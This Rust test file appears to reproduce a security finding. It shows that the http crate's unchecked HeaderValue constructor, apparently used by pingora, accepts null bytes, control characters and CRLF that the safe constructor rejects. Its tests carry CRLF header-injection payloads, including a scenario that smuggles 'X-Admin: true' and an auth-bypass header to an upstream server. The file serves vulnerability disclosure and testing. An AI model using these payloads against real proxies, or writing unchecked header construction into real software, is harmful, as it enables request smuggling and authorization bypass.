//! Finding 4 Reproduction: from_maybe_shared_unchecked bypasses header validation
//!
//! Demonstrates that `HeaderValue::from_maybe_shared_unchecked` accepts
//! invalid bytes that `HeaderValue::from_maybe_shared` (the safe version)
//! correctly rejects.

use bytes::Bytes;
use http::HeaderValue;

/// Test that the safe API rejects null bytes in header values
#[test]
fn test_safe_api_rejects_null_bytes() {
    let value = Bytes::from_static(b"before\x00after");
    let result = HeaderValue::from_maybe_shared(value);
    assert!(
        result.is_err(),
        "Safe API should reject null bytes in header values"
    );
    println!("[OK] from_maybe_shared correctly rejects null bytes");
}

/// Test that the safe API rejects CRLF in header values
#[test]
fn test_safe_api_rejects_crlf() {
    let value = Bytes::from_static(b"value\r\nEvil-Header: injected");
    let result = HeaderValue::from_maybe_shared(value);
    assert!(
        result.is_err(),
        "Safe API should reject CRLF in header values"
    );
    println!("[OK] from_maybe_shared correctly rejects CRLF sequences");
}

/// Test that the safe API rejects bare LF
#[test]
fn test_safe_api_rejects_bare_lf() {
    let value = Bytes::from_static(b"line1\nline2");
    let result = HeaderValue::from_maybe_shared(value);
    assert!(
        result.is_err(),
        "Safe API should reject bare LF in header values"
    );
    println!("[OK] from_maybe_shared correctly rejects bare LF");
}

/// Test that the unsafe API ACCEPTS null bytes (the vulnerability)
#[test]
fn test_unsafe_api_accepts_null_bytes() {
    let value = Bytes::from_static(b"before\x00after");
    // This is what pingora uses — it does NOT validate
    let header_value = unsafe { HeaderValue::from_maybe_shared_unchecked(value) };
    
    // The header value is created successfully despite containing null bytes
    assert_eq!(header_value.as_bytes(), b"before\x00after");
    println!("[!!] from_maybe_shared_unchecked ACCEPTS null bytes: {:?}", header_value);
}

/// Test that the unsafe API ACCEPTS CRLF injection payloads
#[test]
fn test_unsafe_api_accepts_crlf_injection() {
    let value = Bytes::from_static(b"value\r\nEvil-Header: injected");
    let header_value = unsafe { HeaderValue::from_maybe_shared_unchecked(value) };
    
    assert_eq!(
        header_value.as_bytes(),
        b"value\r\nEvil-Header: injected"
    );
    println!("[!!] from_maybe_shared_unchecked ACCEPTS CRLF: {:?}", header_value);
    println!("     An upstream server may interpret this as two separate headers!");
}

/// Test that the unsafe API ACCEPTS control characters
#[test]
fn test_unsafe_api_accepts_control_chars() {
    let control_chars: &[(u8, &str)] = &[
        (0x00, "NULL"),
        (0x01, "SOH"),
        (0x08, "BS"),
        (0x0b, "VT"),
        (0x0c, "FF"),
        (0x7f, "DEL"),
    ];
    
    for &(byte, name) in control_chars {
        let data = vec![b'a', byte, b'b'];
        let value = Bytes::from(data.clone());
        
        // Safe API should reject
        let safe_result = HeaderValue::from_maybe_shared(value.clone());
        assert!(safe_result.is_err(), "Safe API should reject {}", name);
        
        // Unsafe API accepts
        let unsafe_result = unsafe { HeaderValue::from_maybe_shared_unchecked(value) };
        assert_eq!(unsafe_result.as_bytes(), &data);
        println!("[!!] {} (0x{:02x}): safe=REJECT, unsafe=ACCEPT", name, byte);
    }
}

/// Demonstrate the full attack scenario: header value containing CRLF
/// that would be split into two headers by a downstream parser
#[test]
fn test_full_injection_scenario() {
    println!("\n=== Full Injection Scenario ===");
    
    // Attacker sends this as a single header value
    let malicious_value = b"legitimate-value\r\nX-Admin: true\r\nX-Internal-Only: bypass-auth";
    let value = Bytes::from_static(malicious_value);
    
    // Pingora creates the header with unchecked (no validation)
    let header = unsafe { HeaderValue::from_maybe_shared_unchecked(value) };
    
    // Serialize what would be sent to upstream
    let serialized = format!("X-Custom: {}\r\n", 
        String::from_utf8_lossy(header.as_bytes()));
    
    println!("What pingora sends to upstream:");
    println!("---");
    print!("{}", serialized);
    println!("---");
    println!("\nAn upstream HTTP parser would see THREE headers:");
    println!("  1. X-Custom: legitimate-value");
    println!("  2. X-Admin: true");
    println!("  3. X-Internal-Only: bypass-auth");
    
    // Verify the bytes contain the injection
    assert!(header.as_bytes().windows(2).any(|w| w == b"\r\n"));
    println!("\n[!!] Header injection confirmed — CRLF present in header value");
}

fn main() {
    println!("Run with: cargo test -- --nocapture");
}
